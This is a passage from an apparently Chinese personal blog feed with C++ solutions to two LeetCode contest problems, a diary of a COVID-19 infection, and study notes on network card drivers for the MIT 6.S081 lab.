&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6267-添加边使所有节点度数都为偶数"><a href="#6267-添加边使所有节点度数都为偶数" class="headerlink" title="6267. 添加边使所有节点度数都为偶数"></a>6267. 添加边使所有节点度数都为偶数</h3><p> 显示英文描述</p>
<p>给你一个有 <code>n</code> 个节点的 <strong>无向</strong> 图，节点编号为 <code>1</code> 到 <code>n</code> 。再给你整数 <code>n</code> 和一个二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点 <code>ai</code> 和 <code>bi</code> 之间有一条边。图不一定连通。</p>
<p>你可以给图中添加 <strong>至多</strong> 两条额外的边（也可以一条边都不添加），使得图中没有重边也没有自环。</p>
<p>如果添加额外的边后，可以使得图中所有点的度数都是偶数，返回 <code>true</code> ，否则返回 <code>false</code> 。</p>
<p>点的度数是连接一个点的边的数目。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/26/agraphdrawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5, edges = [[1,2],[2,3],[3,4],[4,2],[1,4],[2,5]]</span><br><span class="line">输出：true</span><br><span class="line">解释：上图展示了添加一条边的合法方案。</span><br><span class="line">最终图中每个节点都连接偶数条边。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/26/aagraphdrawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4, edges = [[1,2],[3,4]]</span><br><span class="line">输出：true</span><br><span class="line">解释：上图展示了添加两条边的合法方案。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/26/aaagraphdrawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4, edges = [[1,2],[1,3],[1,4]]</span><br><span class="line">输出：false</span><br><span class="line">解释：无法添加至多 2 条边得到一个符合要求的图。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>3 &lt;= n &lt;= 105</code></li>
<li><code>2 &lt;= edges.length &lt;= 105</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>1 &lt;= ai, bi &lt;= n</code></li>
<li><code>ai != bi</code></li>
<li>图中不会有重边</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-324/problems/add-edges-to-make-degrees-of-all-nodes-even/">https://leetcode.cn/contest/weekly-contest-324/problems/add-edges-to-make-degrees-of-all-nodes-even/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>思维题目
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目实际比较有意思，本质是个思维的问题，可能不需要特别复杂的技巧。分析如下：</li>
</ol>
<ul>
<li>如果使得所有顶点的度都为偶数，首先我们需要找到所有度为奇数的顶点，此时我们直接统计所有顶点的度数即可；<br>我们仔细分析可以知道顶点度数为奇数的顶点最多只能有 $4$ 个，因此我们分情况来进行讨论:</li>
<li>度数位奇数的顶点数目为 $0$ 个：此时所有的顶点的度数均为偶数，则直接返回 $false$；</li>
<li>度数位奇数的顶点数目为 $1$ 个：此时由于顶点不能含有自环，因此此时我们无法往这个顶点上加边数使得该顶点的度数为偶数，由于 $1$ 条边连着两个不同的顶点，因此我们无法完成；</li>
<li>度数位奇数的顶点数目为 $2$ 个：此时就非常有意思了，可以有多种情况分析：<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212191721676.png"><ul>
<li>假设这两个顶点之间没有边，我们直接将这两个顶点连起来，使得每个顶点都增加 $1$ 条边，从而使得两个顶点的度数均变为偶数；</li>
<li>假设这两个顶点之间有边，但这两个顶点与某个顶点 $p$ 都不存在边，此时就将 $p$ 分别与这两个顶点相连，使得每个顶点都增加 $1$ 条边，从而使得两个顶点的度数均变为偶数；</li>
<li>上述两种情况都不满足，则不存在可以使得两个顶点的度数均为偶数的解决办法；</li>
</ul>
</li>
<li>度数位奇数的顶点数目为 $3$ 个：此时最多只能加两条边，无论如何增加均无法满足；</li>
<li>度数位奇数的顶点数目为 $4$ 个：此时只需要找到 $4$ 个顶点是否存在不想交的两对顶点，且顶点对之间不存在边即可。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(V + E)$，$V$ 表示顶点的数学，$E$ 表示边的数目。</li>
<li>空间复杂度：时间复杂度为 $O(V + E)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPossible</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        vector&lt;unordered_set&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; vertex;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (graph[i].<span class="built_in">size</span>() % <span class="number">2</span>) &#123;</span><br><span class="line">                vertex.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (vertex.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vertex.<span class="built_in">size</span>() == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> a = vertex[<span class="number">0</span>], b = vertex[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!graph[a].<span class="built_in">count</span>(b)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (a != i &amp;&amp; b != i &amp;&amp; !graph[i].<span class="built_in">count</span>(a) &amp;&amp; !graph[i].<span class="built_in">count</span>(b)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vertex.<span class="built_in">size</span>() == <span class="number">1</span> || vertex.<span class="built_in">size</span>() == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (vertex.<span class="built_in">size</span>() == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">int</span> a = vertex[<span class="number">0</span>], b = vertex[<span class="number">1</span>], c = vertex[<span class="number">2</span>], d = vertex[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">return</span> !graph[a].<span class="built_in">count</span>(b) &amp;&amp; !graph[c].<span class="built_in">count</span>(d) ||</span><br><span class="line">                   !graph[a].<span class="built_in">count</span>(c) &amp;&amp; !graph[b].<span class="built_in">count</span>(d) ||</span><br><span class="line">                   !graph[a].<span class="built_in">count</span>(d) &amp;&amp; !graph[b].<span class="built_in">count</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6268-查询树中环的长度"><a href="#6268-查询树中环的长度" class="headerlink" title="6268. 查询树中环的长度"></a>6268. 查询树中环的长度</h3><p>给你一个整数 <code>n</code> ，表示你有一棵含有 <code>2n - 1</code> 个节点的 <strong>完全二叉树</strong> 。根节点的编号是 <code>1</code> ，树中编号在<code>[1, 2n - 1 - 1]</code> 之间，编号为 <code>val</code> 的节点都有两个子节点，满足：</p>
<ul>
<li>左子节点的编号为 <code>2 * val</code></li>
<li>右子节点的编号为 <code>2 * val + 1</code></li>
</ul>
<p>给你一个长度为 <code>m</code> 的查询数组 <code>queries</code> ，它是一个二维整数数组，其中 <code>queries[i] = [ai, bi]</code> 。对于每个查询，求出以下问题的解：</p>
<ol>
<li>在节点编号为 <code>ai</code> 和 <code>bi</code> 之间添加一条边。</li>
<li>求出图中环的长度。</li>
<li>删除节点编号为 <code>ai</code> 和 <code>bi</code> 之间新添加的边。</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li><strong>环</strong> 是开始和结束于同一节点的一条路径，路径中每条边都只会被访问一次。</li>
<li>环的长度是环中边的数目。</li>
<li>在树中添加额外的边后，两个点之间可能会有多条边。</li>
</ul>
<p>请你返回一个长度为 <code>m</code> 的数组 <code>answer</code> ，其中 <code>answer[i]</code> 是第 <code>i</code> 个查询的结果<em>。</em></p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/25/bexample1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, queries = [[5,3],[4,7],[2,3]]</span><br><span class="line">输出：[4,5,3]</span><br><span class="line">解释：上图是一棵有 23 - 1 个节点的树。红色节点表示添加额外边后形成环的节点。</span><br><span class="line">- 在节点 3 和节点 5 之间添加边后，环为 [5,2,1,3] ，所以第一个查询的结果是 4 。删掉添加的边后处理下一个查询。</span><br><span class="line">- 在节点 4 和节点 7 之间添加边后，环为 [4,2,1,3,7] ，所以第二个查询的结果是 5 。删掉添加的边后处理下一个查询。</span><br><span class="line">- 在节点 2 和节点 3 之间添加边后，环为 [2,1,3] ，所以第三个查询的结果是 3 。删掉添加的边。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/25/aexample2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, queries = [[1,2]]</span><br><span class="line">输出：[2]</span><br><span class="line">解释：上图是一棵有 22 - 1 个节点的树。红色节点表示添加额外边后形成环的节点。</span><br><span class="line">- 在节点 1 和节点 2 之间添加边后，环为 [2,1] ，所以第一个查询的结果是 2 。删掉添加的边。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= n &lt;= 30</code></li>
<li><code>m == queries.length</code></li>
<li><code>1 &lt;= m &lt;= 105</code></li>
<li><code>queries[i].length == 2</code></li>
<li><code>1 &lt;= ai, bi &lt;= 2n - 1</code></li>
<li><code>ai != bi</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-324/problems/cycle-length-queries-in-a-tree/">https://leetcode.cn/contest/weekly-contest-324/problems/cycle-length-queries-in-a-tree/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> LCA问题</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>本题实际真心算不上 $hard$ 问题，确实太过于简单了，本质为求二叉树中两个节点的最近公共祖先的问题，设给定点 $(a,b)$, 假设两点的最近公共祖先为点 $p$，则构成的环的大小为 $a$ 到 $p$ 的距离加上 $b$ 到 $p$ 距离再加上 $1$，求 $lca$ 的方法和技巧很多，在此不再描述，最简单的莫过于求二者到根节点的公共路径。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nm)$，其中 $m$ 表示查询的次数。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dist</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; path1, path2;</span><br><span class="line">        path1.<span class="built_in">emplace_back</span>(x);</span><br><span class="line">        <span class="keyword">while</span> (x &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            x /= <span class="number">2</span>;</span><br><span class="line">            path1.<span class="built_in">emplace_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        path2.<span class="built_in">emplace_back</span>(y);</span><br><span class="line">        <span class="keyword">while</span> (y &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            y /= <span class="number">2</span>;</span><br><span class="line">            path2.<span class="built_in">emplace_back</span>(y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(path1.<span class="built_in">begin</span>(), path1.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">reverse</span>(path2.<span class="built_in">begin</span>(), path2.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> res = path1.<span class="built_in">size</span>() + path2.<span class="built_in">size</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; path1.<span class="built_in">size</span>() &amp;&amp; i &lt; path2.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (path1[i] == path2[i]) &#123;</span><br><span class="line">                res -= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cycleLengthQueries</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = queries.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : queries) &#123;</span><br><span class="line">            <span class="type">int</span> x = v[<span class="number">0</span>],  y = v[<span class="number">1</span>];</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(<span class="built_in">dist</span>(x, y) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>记录covid-2019阳性的经历</title>
    <url>/2022/12/20/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/80/</url>
    <content><![CDATA[<h3 id="记录covid-19阳性的经历"><a href="#记录covid-19阳性的经历" class="headerlink" title="记录covid-19阳性的经历"></a>记录covid-19阳性的经历</h3><p>最近的新冠阳性刚刚恢复，自身感觉差不多已经恢复到之前的状态，还是有必要记录一下整个历程，让人不得不记录这个重要事件。</p>
<h4 id="潜伏期"><a href="#潜伏期" class="headerlink" title="潜伏期"></a>潜伏期</h4><p>2022年12月8日时，突然接到家属的电话告知其突然发烧，然后去医院核酸阳性的结果，然后就当晚她就去酒店隔离了。当时自己还在庆兴自己的没有被感染。回到单位后，随上报领导该事宜，按照要求在办公室隔离并下午去了同济医院做好单管核酸采样，结果仍然为阴性，当时以为应该没有什么问题了，其实后来回忆起来很大概率是在核酸采样的途中被感染的。此时核酸采样的人员中据说百分之五十的概率都是阳性的，排队那么密集，肯定一堆阳性感染患者。周末平安的度过了两天，身体上感觉非常正常，到了周一以后，领导要求再次隔离一天并做好核酸采样，结果2022年12月12日那天突然感觉身体有些莫名其妙的冷，坐在哪里工作时，感觉身体冷的非常难受，当时以为自己穿的太单薄了，也没有在意，然后核酸采样仍然为阴性，就准备第二天正常去上班了。</p>
<h4 id="发病初期"><a href="#发病初期" class="headerlink" title="发病初期"></a>发病初期</h4><ul>
<li><strong>2022年12月13日</strong><br>2022年12月13日夜里，浑身莫名其妙的冷，裹着被子裹到最紧都感到浑身冰冷，然后感觉身体开始发热，这大概就是发烧的前兆。12月13日早上起来，就感觉头疼脚轻的，一量体温38.2°，果真发烧，立即打电话上报，然后在家休息。然后立即跑到同济去做了一个单管核酸，开车的途中那叫一个难受，感觉浑身乏力，在排队等待做核酸的过程中感觉浑身难受，几乎都要站不稳了。真佩服自己，其实当时已经高烧39°了，然后还跑到山姆会员店买了一堆家庭生活用品。回去之后立马就收拾好衣服，跑到隔离酒店里面，然后赶紧开好房间，躺下就起不来，整个人头疼欲裂，量了下体温39.5°。拖着疲惫的身子到楼下药店去买退烧药，结果都买不到，后来药店人员好心给了我一颗布洛芬缓释胶囊，回来后买了点东西吃完药躺下就睡。最难受的是，因为身体高热，导致心跳增快，静止状态心率一直飙到140，一直下不不来，就是感觉心跳一直很快很快。就这样迷迷糊糊的到了第二天。</li>
</ul>
<h4 id="发病中期"><a href="#发病中期" class="headerlink" title="发病中期"></a>发病中期</h4><ul>
<li><p><strong>2022年12月14日</strong><br>2022年12月14日早上起来，感觉精神好了许多，心跳没有昨天那么变态了，量了下体温38.5°，体温终于降下来了，同时稍微有点食欲了，赶紧出去买饭吃了，好恢复体力。不过身体不舒服还是比较严重，头疼比较严重，然后有些干咳。</p>
</li>
<li><p><strong>2022年12月15日</strong><br>2022年12月15日早上起来，感觉精神好了许多，量了下体温37°，体温终于正常不烧了，心率回复到正常值。但是新的问题出来了，喉咙开始疼，非常疼的那种，然后干咳也严重了一些。食欲非常好了，但是味觉似乎减退了许多，吃很多外卖都感觉闲的不要不要的，无法下咽。</p>
</li>
<li><p><strong>2022年12月16日</strong><br>2022年12月16日早上起来，感觉精神好了许多，量了下体温36°，体温完全正常了。喉咙开始非常非常疼，甚至咽口水都疼那种，干咳的越来越严重了。食欲非常好，各种水果，各种食物吃吃吃。但是喉咙那个疼啊，实在受不了了，赶紧到楼下买了喝西瓜霜口含糖，吃了几个发现啥用都不没有，感觉喉咙快废掉了，看网上说的是病毒在上呼吸道大量复制，呼吸道黏膜水煮的原因，只能等待慢慢恢复了。晚上睡觉的时候，发现新的问题来了，鼻腔内部也开始发炎了。</p>
</li>
<li><p><strong>2022年12月17日</strong><br>2022年12月17日早上起来，精神不错，唯一的问题是喉咙疼，鼻腔内部疼，外加严重的干咳，快把肺咳掉那种。喉咙疼没法，只能喝水加上吃各种水果来减轻。鼻腔内部发炎严重，整个鼻子早上起来擤鼻涕全是血丝，看来鼻黏膜也受到了感染，内部充血严重。本来自己鼻子就不太好，晚上睡觉时，鼻腔干的无法入睡，只能赶紧买好生理海水喷雾和红霉素软膏，缓解鼻腔干燥带来的不适感。</p>
</li>
<li><p><strong>2022年12月18日</strong><br>2022年12月18日早上起来，精神不错，喉咙的疼痛有所减轻，但是干咳的越来越严重了，感觉就是病毒此时再体内大量的复制，想借助人体的咳嗽把病毒排出去，然后传染给下一个宿主。开始起来测试抗原，抗原还是非常明显的阳性，此时身体内部应该对外的感染性最强，因为此时是自己对外排毒的最高峰。鼻子鼻腔内部的黏膜应该好多都破了，晚上睡觉干的鼻腔内部全部都是血痂，只能早上起来用温水清理掉，晚上睡觉还是很难受的说。但是白天来说，整个人的精神状态还算比较好，出去帮家里采购了物资，顺便去医院帮小朋友取了药品。</p>
</li>
<li><p><strong>2022年12月19日</strong><br>2022年12月19日早上起来，喉咙的疼痛基本上很轻了，还是干咳的比较严重。开始起来测试抗原，抗原已经变成了非常淡的弱阳性。鼻腔内部的黏膜应该好多都破了，晚上睡觉只能用嘴巴呼吸还是非常难受，但愿不要再出现鼻炎的症状。白天帮小孩去了汉口同济取了治疗哮喘的药，还是非常愉快的取了回来，顺便去做个核酸，争取核酸阴性后早日复工。</p>
</li>
<li><p><strong>2022年12月20日</strong><br>2022年12月20日早上起来，喉咙基本不疼了，干咳症状也比较轻了。最高兴的是，第八天了，抗原终于变成了阴性，收拾好东西从隔离酒店搬回家，回家的感觉真好，又见到两个可爱的小朋友了。下午第一时间感到理发店去理了个发，坏心情一扫而光，身体感觉恢复到之前的差不多百分之九十了。我以为核酸也可以转阴了，然后跑去同济做了个核酸，发现结果还是阳性，真心希望快点好起来，好想回到之前状态最好的那段时间，每天都可以去健身房健身游泳，每天精神抖擞的样子。</p>
</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>终于可以满血复活了，总的来说有啥也别有病，不管穷也好富也好，得病的感受真心太痛苦了。生病的时候就在感慨健康才是最重要的，其余的都属浮云。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人总结</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】lab11 network</title>
    <url>/2022/12/23/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/84/</url>
    <content><![CDATA[<h2 id="MIT-6-S081-lab11-network"><a href="#MIT-6-S081-lab11-network" class="headerlink" title="MIT 6.S081 lab11 network"></a>MIT 6.S081 lab11 network</h2><p>这个 <code>lab</code>我比较喜欢，因为本身从事过几年的网络设备研发工作，工作内容整体上来看倒不是非常复杂的。最感兴趣的倒是对网卡收包和发包部分的处理程序，因为本身对 <code>dpdk</code> 比较感兴趣的原因。这个 <code>lab</code> 其实涉及到一些网卡驱动的工作，代码内容看起来很大，倒是整个 <code>lab</code> 需要写的代码确实不需要太多，废话不多说，先总结一下该课程的课程内容，再针对性的对网卡的处理流程做一下回顾。</p>
<ul>
<li><p>对于操作系统来说网卡也只是普通的外设，通过网络可以把不同的计算机连接起来，组成一个局域网。前面的几个章节讲了下网络协议，比较简单。常见的几个网络协议，<code>IP,arp,udp,tcp</code> 等都做了简要的回顾。</p>
</li>
<li><p>网络协议栈：操作系统内部含有一个网络协议栈，通过 <code>NIC driver</code> 从网卡中收包，然后进行处理。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231443462.png"><br>当一个<code>packet</code>从网络送达时，网卡会从网络中将<code>packet</code>接收住并传递给网卡驱动。网卡驱动会将<code>packet</code>向网络协议栈上层推送。在<code>IP</code>层，软件会检查并校验<code>IP header</code>，将其剥离，再把剩下的数据向上推送给<code>UDP</code>。<code>UDP</code>也会检查并校验<code>UDP header</code>，将其剥离，再把剩下的数据加入到<code>socket layer</code>中相应文件描述符对应的队列中。所以一个packet在被收到之后，会自底向上逐层解析并剥离<code>header</code>。当应用程序发送一个<code>packet</code>，会自顶向下逐层添加<code>header</code>，直到最底层packet再被传递给硬件网卡用来在网络中传输。所以内核中的网络软件通常都是被嵌套的协议所驱动。</p>
</li>
<li><p>网卡在处理报文时有个重要的缓冲区叫做 <code>packet buffer</code>，实际的网络包处理都在 <code>ring buffer</code> 中进行处理。所以当收到了一个 <code>packet</code> 之后，它会被拷贝到一个<code>ring buffer</code> 中，这个 <code>ring buffer</code>会在网络协议栈中传递。通常整个网络协议栈都会使用<code>buffer</code>分配器，<code>buffer</code>结构。</p>
</li>
<li><p>网卡的收包的处理流程:当网卡收到了一个 <code>packet</code>，它会生成一个中断。系统内核中处理中断的程序会被触发，并从网卡中获取 <code>packet</code>。因为我们不想现在就处理这个 <code>packet</code>，中断处理程序通常会将 <code>packet</code>挂在一个队列中并返回，<code>packet</code> 稍后再由别的程序处理。所以中断处理程序这里只做了非常少的工作，也就是将 <code>packet</code>从网卡中读出来，然后放置到队列中。而在计算机的 <code>RAM</code> 中，会有 <code>GB</code>级别的内存，所以计算机的内存要大得多。如果有大量的 <code>packet</code> 发送到网卡，网卡可能会没有足够的内存来存储 <code>packet</code>，所以我们需要尽快将packet拷贝到计算机的内存中。</p>
<ul>
<li><p>内核中独立的线程来专门处理 <code>packet</code>，当该线程处理时如果发现该 <code>packet</code> 是某个 <code>socket</code> 需要等待读取的报文，则将该 <code>packet</code> 放置到该 <code>socket</code> 队列的队列中，等待应用程序读取；</p>
</li>
<li><p>如果该内核作为路由器，则将报文进行处理后，放置到专门的网卡发送队列即可。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231541532.png"></p>
</li>
<li><p>当<code>packet</code> 到达时，网卡会将<code>packet</code>存在自己的缓存中，并向主机发送中断，所以网卡内部会有一个队列。而主机的驱动包含了一个循环，它会与网卡交互，并询问当前是否缓存了<code>packet</code>。如果是的话，主机的循环会逐字节的拷贝<code>packet</code>到主机的内存中，再将内存中的<code>packet</code>加到一个队列中。在接受和发送报文时，网卡通过 <code>DMA</code> 控制内存的读取权限，直接从内存中写入和读取网络报文的内容。</p>
</li>
</ul>
</li>
<li><p>通过中断的方式处理报文时，会发现存在一定的缺陷，由于 <code>CPU</code> 频繁的陷入中断处理程序，从而导致 <code>CPU</code> 的报文处理效率不高，不断的陷入中断导致宝贵的 <code>CPU</code> 资源被浪费。可以发现到达一定的处理瓶颈后报文处理速度会下降，过多的 <code>CPU</code> 资源被浪费在处理中断上。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231605680.png"></p>
</li>
<li><p>将网卡的处理模式从中断改为轮询模式。将中断模式（Interrupt Scheme）转变成了轮询模式（Polling Scheme）。在高负载的情况下，中断会被关闭，并且<code>CPU</code>会一直运行这里的循环中，不断读取 <code>packet</code> 并处理<code>packet</code>。还是存在处理packet的线程和中断处理程序。当网卡第一次触发中断时，会导致中断处理函数的运行。但是中断处理函数并不会从网卡拷贝<code>packet</code>，相应的，它会唤醒处理 <code>packet</code> 的线程，并且关闭网卡的中断，这样接下来就收不到任何中断了。处理 <code>packet</code> 的线程会有一个循环，在循环中它会检查并从网卡拉取几个 <code>packet</code>，论文中我记得是最多拉取 <code>5</code> 个 <code>packet</code>，之后再处理这些<code>packet</code>。所以现在处理packet的线程是从网卡读取<code>packet</code>，而不是从中断处理程序读取。如果网卡中没有等待处理的<code>packet</code>，那么处理线程会重新打开网卡中断，并进入<code>sleep</code>状态。因为最后打开了中断，当下一个<code>packet</code>到达时，中断处理程序会唤醒处理<code>packet</code>线程，线程会从<code>sleep</code>状态苏醒并继续处理<code>packet</code>。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231608802.png"></p>
</li>
<li><p>e1000的网卡驱动程序:<br>本文中也详细的描述了 <code>E1000</code> 网卡的驱动程序以及相应的网卡手册，参考给定的手册即可，其实比较简单。我们可以看到整个网卡的架构图如下:<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202212231628255.png"></p>
</li>
<li><p><code>DMA</code> 工作原理: <code>dma</code> 用来处理网卡收发报文时，网卡芯片上的内存与主机内存之间的数据交换，主要是报文数据与描述符。</p>
<ul>
<li>在接受方向上,<code>DMA</code> 存储在网卡上的 <code>FIFO</code> 缓存中的数据存到主机上的接受队列中，主要是数据报文的存储地址与描述符，同时也将以上内容写入到主机的内存中。</li>
<li>在发送方向上,<code>DMA</code> 将主机内存中数据拷贝到芯片的缓存去中，同时也将发送描述符写回到主机的内存中。</li>
<li><code>buffer queue</code> 就是网卡内部的缓冲队列，发送和接受都有，分别是<code>TX</code> 和 <code>RX</code>。DMA机制作用如下：在接收时，<code>DMA</code> 引擎将队列中的数据拷贝到 <code>host</code> 内存，然后中断通知 <code>CPU</code>。<code>DMA</code> 机制是靠网卡设备的 <code>DMA Engine</code> 实现的，操作系统只起到配合的作用，例如在内存中划分一块<code>DMA</code> 缓冲区用于读写。</li>
</ul>
</li>
<li><p><code>initial</code>：网卡初始化时，需要设置网卡的工作模式，并同时设置好网卡的接收描述符的 <code>ring buffer</code> 与缓存 <code>mbuffer</code>，并设置好网卡的发送描述符的 <code>ring buffer</code> 与缓存 <code>mbuffer</code>，同时设置好初始的 <code>FIFO</code> 队列，当设置好初始队列时 <code>head</code> 与 <code>tail</code>。</p>
</li>
